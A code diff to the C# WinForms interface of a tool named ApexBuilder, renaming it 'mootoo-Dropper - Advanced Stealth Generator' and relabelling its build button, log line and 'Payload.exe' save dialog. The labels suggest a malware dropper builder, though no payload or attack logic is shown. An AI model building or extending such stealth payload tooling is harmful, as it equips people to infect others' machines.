@@ -25,7 +25,7 @@ namespace ApexBuilder
 
         private void InitializeComponent()
         {
-            this.Text = "Apex Builder - Master Control Panel (v3 EXPERT)";
+            this.Text = "mootoo-Dropper - Advanced Stealth Generator (by mootoo11)";
             this.Size = new Size(650, 600);
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
             this.MaximizeBox = false;
@@ -80,7 +80,7 @@ namespace ApexBuilder
             tabBuild.BackColor = bgDark;
             txtIconPath = CreateFileField(tabBuild, "Custom Icon (.ico):", 30);
             
-            btnBuild = new Button { Text = "GENERATE APEX PAYLOAD", Location = new Point(200, 100), Width = 250, Height = 50, BackColor = accent, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 10, FontStyle.Bold) };
+            btnBuild = new Button { Text = "GENERATE mootoo-Dropper", Location = new Point(200, 100), Width = 250, Height = 50, BackColor = accent, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 10, FontStyle.Bold) };
             btnBuild.Click += BtnBuild_Click;
             tabBuild.Controls.Add(btnBuild);
 
@@ -93,7 +93,7 @@ namespace ApexBuilder
             txtLog = new TextBox { Dock = DockStyle.Bottom, Height = 140, Multiline = true, ReadOnly = true, ScrollBars = ScrollBars.Vertical, BackColor = Color.Black, ForeColor = Color.Lime, BorderStyle = BorderStyle.None, Font = new Font("Consolas", 9) };
             this.Controls.Add(txtLog);
             
-            Log("Apex Builder v3 (EXPERT) Loaded.");
+            Log("mootoo-Dropper (NativeAOT) Loaded. [Dev: github.com/mootoo11]");
         }
 
         private void AddHeader(TabPage p, string text, int y)
@@ -161,7 +161,7 @@ namespace ApexBuilder
 
             using (SaveFileDialog sfd = new SaveFileDialog()) {
                 sfd.Filter = "Executable File (*.exe)|*.exe";
-                sfd.Title = "Save Apex Payload As...";
+                sfd.Title = "Save mootoo-Dropper Payload As...";
                 sfd.FileName = "Payload.exe";
 
                 if (sfd.ShowDialog() == DialogResult.OK) {
